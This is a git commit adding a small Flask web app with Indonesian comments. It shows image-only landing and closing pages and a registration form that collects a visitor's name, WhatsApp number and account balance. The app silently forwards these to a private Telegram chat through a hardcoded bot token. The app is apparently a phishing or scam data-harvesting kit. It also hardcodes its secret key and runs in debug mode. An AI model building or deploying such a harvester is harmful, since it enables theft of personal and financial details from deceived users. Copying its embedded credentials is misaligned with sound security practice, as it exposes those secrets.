0f514f59a84dae4887db6e21f2855e4f1c0140bb
01programmer1991 <01programmer1991@gmail.com>
2025-08-17 16:32:32 +0700

    first commit

---
+++ app.py
@@ -0,0 +1,45 @@
+from flask import Flask, render_template, request, redirect, session
+import requests
+import os
+
+app = Flask(__name__)
+app.secret_key = 'j1s34ft43utbu76'
+
+TELEGRAM_BOT_TOKEN = '7362085728:AAHOZfP7Say8fkAihspBmUzS8EiGTbU7oLw'
+TELEGRAM_CHAT_ID = '7632946195'
+
+@app.route('/')
+def home():
+    # Halaman 1 hanya tampil gambar full body
+    return render_template('home.html')
+
+@app.route("/registrasi", methods=['GET', 'POST'])
+def registrasi():
+    if request.method == 'POST':
+        nama = request.form.get('nama')
+        WA = request.form.get('WA')
+        saldo = request.form.get('saldo')
+
+        caption = (
+            "🔔DATA BARU:\n"
+            "───────────────────\n"
+            f"🧾Nama: {nama}\n"
+            f"📱WA: {WA}\n"
+            f"💰saldo: {saldo}"
+        )
+
+        requests.post(
+                f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
+                data={'chat_id': TELEGRAM_CHAT_ID, 'text': caption}
+            )
+
+        return redirect('/close')
+    return render_template('registrasi.html')
+
+@app.route('/close')
+def close():
+    # halaman3 hanya tampil gambar penutup full body
+    return render_template('close.html')
+
+if __name__ == '__main__':
+    app.run(debug=True)
